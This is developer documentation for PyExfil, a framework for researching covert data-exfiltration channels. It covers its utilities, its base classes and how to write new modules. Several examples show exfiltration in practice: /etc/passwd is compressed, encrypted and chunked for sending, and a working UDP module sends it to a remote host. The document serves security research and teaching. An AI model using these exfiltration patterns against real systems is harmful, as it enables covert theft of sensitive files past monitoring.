# Documentation | PyExfil

PyExfil is a Python 3 framework for researching data exfiltration techniques. Each module implements a distinct covert channel. This document covers how to use the shared utilities, how to write a new module using the class hierarchy, and where to place it.

For the full class hierarchy reference see [ARCHITECTURE.md](ARCHITECTURE.md).
For open contribution tasks see [CALL_TO_ACTION.md](CALL_TO_ACTION.md).

## `zlib` known issue

`zlib` is part of the Python standard library but depends on a system library. If you hit an import error:

- Debian/Ubuntu: `apt-get install zlib1g-dev`
- macOS: `brew install zlib`

## Shared Utilities (`pyexfil/includes/`)

### `prepare`: packet prep pipeline

Compresses, encrypts, base64-encodes, and chunks a file or byte string into ready-to-send packets. Use this instead of rolling your own serialisation.

```python
from pyexfil.includes.prepare import PrepFile, DecodePacket, RebuildFile

proc    = PrepFile('/etc/passwd', kind='binary', enc_key='s3cr3t', max_size=512)
packets = proc['Packets']   # list of bytes chunks

decoded = [DecodePacket(p, enc_key='s3cr3t') for p in packets]
data    = RebuildFile(decoded)   # original bytes
```

### `encryption_wrappers`: crypto helpers

```python
from pyexfil.includes.encryption_wrappers import AESEncryptOFB, AESDecryptOFB, RC4

ciphertext = AESEncryptOFB(key=b'sixteen-byte-key', text=b'secret')
plaintext  = AESDecryptOFB(key=b'sixteen-byte-key', data=ciphertext)
```

`AESEncryptOFB` prepends a random 16-byte IV to its output. `AESDecryptOFB` reads the first 16 bytes as the IV automatically.

### `general`: low-level helpers

```python
from pyexfil.includes.general import _icmp_checksum, _split_every_n, does_file_exist
```

### `exceptions`: custom exception types

```python
from pyexfil.includes.exceptions import FileDoesNotExist, InvalidPacketFormat
```

Review these before reimplementing common logic.

## Writing a New Module

### 1. Choose the right pillar

| Pillar | Base class | Use when… |
|--------|-----------|-----------|
| `network/` | `NetworkModule` | Exfil over a standard network protocol (DNS, ICMP, HTTP, FTP…) |
| `Comm/` | `CommModule` | Bidirectional C2 channel (ARP, NTP body, MDNS…) |
| `physical/` | `PhysicalModule` | Physical-layer channel (audio tones, QR codes, ultrasonic…) |
| `Stega/` | `StegaModule` | File-in / file-out steganography (PNG pixels, braille, DataMatrix…) |

### 2. Create the module folder

```
pyexfil/<pillar>/<ModuleName>/
    __init__.py       ← empty or re-exports the class
    <module>.py       ← implementation
```

### 3. Implement the class

Import the base class from `pyexfil.includes.base` and implement only the abstract methods your pillar requires.

#### NetworkModule example

```python
#!/usr/bin/env python3
import socket
from pyexfil.includes.base import NetworkModule

class MyExfil(NetworkModule):
    MODULE_NAME = "MyExfil"
    PROTOCOL    = "udp"

    def _send_impl(self, data, **kwargs):
        # data is typically a file path (str) or bytes payload
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data if isinstance(data, bytes) else data.encode(), (self.host, self.port))
        sock.close()
        return True

    def _listen_impl(self, callback, **kwargs):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.host, self.port))
        sock.settimeout(1.0)
        while not self._stop_event.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            callback(data, {"src": addr})
        sock.close()
```

Usage:

```python
m = MyExfil(host="10.0.0.1", port=5005, enc_key="s3cr3t")
m.send("/etc/passwd")                        # blocking send
t = m.listen(callback=my_cb, blocking=False) # non-blocking listener thread
m.stop()                                     # graceful shutdown
```

#### CommModule example

```python
from pyexfil.includes.base import CommModule

class MyComm(CommModule):
    MODULE_NAME = "MyComm"
    PROTOCOL    = "arp"

    def _send_impl(self, data, **kwargs):
        # unicast to a specific peer
        return True

    def _broadcast_impl(self, data, **kwargs):
        # layer-2 broadcast: required for CommModule
        return True

    def _listen_impl(self, callback, **kwargs):
        # sniff/listen loop; check self._stop_event
        while not self._stop_event.is_set():
            # ... receive packet ...
            callback(payload, {"src": addr})
```

#### PhysicalModule example

```python
from pyexfil.includes.base import PhysicalModule

class MyPhysical(PhysicalModule):
    MODULE_NAME = "MyPhysical"
    PROTOCOL    = "audio-tones"

    def _send_impl(self, data, **kwargs):
        # encode data as audio and play it
        return True

    # Override _receive_impl only if the channel can be read back
    # (e.g. microphone listening for ultrasonic tones)
```

#### StegaModule example

```python
from pyexfil.includes.base import StegaModule

class MyStega(StegaModule):
    MODULE_NAME = "MyStega"
    PROTOCOL    = "png-lsb"

    def _encode_impl(self, carrier, payload, output, **kwargs):
        # open carrier image, embed payload, save to output
        return True

    def _decode_impl(self, carrier, stego, output, **kwargs):
        # open stego image, extract hidden bytes, write to output
        return True
```

Usage:

```python
s = MyStega()
s.encode("cover.png", "secret.bin", "stego.png")
s.decode("cover.png", "stego.png", "recovered.bin")
```

### 4. Wire the `_stop_event` in listen loops

Every `_listen_impl` must honour `self._stop_event` so `module.stop()` works:

```python
sock.settimeout(1.0)                    # short timeout allows the check
while not self._stop_event.is_set():
    try:
        data, addr = sock.recvfrom(4096)
    except socket.timeout:
        continue                        # loop back and check again
    callback(data, {"src": addr})
```

### 5. Set class-level metadata

```python
class MyModule(NetworkModule):
    MODULE_NAME = "MyModule"   # appears in logs and repr()
    PROTOCOL    = "dns/udp"    # free-form transport label
    # Do NOT set MODULE_TYPE: it is inherited from the pillar
```

### 6. Register the module in `__init__.py`

The pillar `__init__.py` files are the public import surface. Add your class:

```python
# pyexfil/network/__init__.py
from pyexfil.network.MyModule.my_module import MyExfil
```

Or at minimum, ensure your module folder has its own `__init__.py` so it is importable:

```python
# pyexfil/network/MyModule/__init__.py
from pyexfil.network.MyModule.my_module import MyExfil
```

### 7. Write a test

Place a test file in `tests/`. The minimum set:

```python
import pytest
from pyexfil.network.MyModule.my_module import MyExfil

class TestMyExfil:
    def test_instantiation(self):
        m = MyExfil(host="127.0.0.1", port=9999)
        assert m.MODULE_NAME == "MyExfil"
        assert m.MODULE_TYPE == "network"

    def test_send_returns_bool(self):
        m = MyExfil(host="127.0.0.1", port=9999)
        result = m.send(b"hello")
        assert isinstance(result, bool)

    def test_listen_nonblocking(self):
        m = MyExfil(host="127.0.0.1", port=9999)
        t = m.listen(callback=lambda d, m: None, blocking=False)
        assert t is not None and t.is_alive()
        m.stop()
```

Run with:

```bash
python -m pytest tests/ -v
```

## Security Considerations

- Never hardcode credentials or encryption keys; accept them as constructor parameters.
- Use `AESEncryptOFB` from `encryption_wrappers`: it generates a random IV per call.
- Validate all external input at system boundaries (sockets, file paths).
- All activities with PyExfil must comply with applicable laws and authorised test scope.

## Legal and Ethical Use

PyExfil is provided for security research and education. Users are solely responsible for ensuring all activities comply with applicable laws and ethical guidelines. The developers disclaim any liability for misuse.

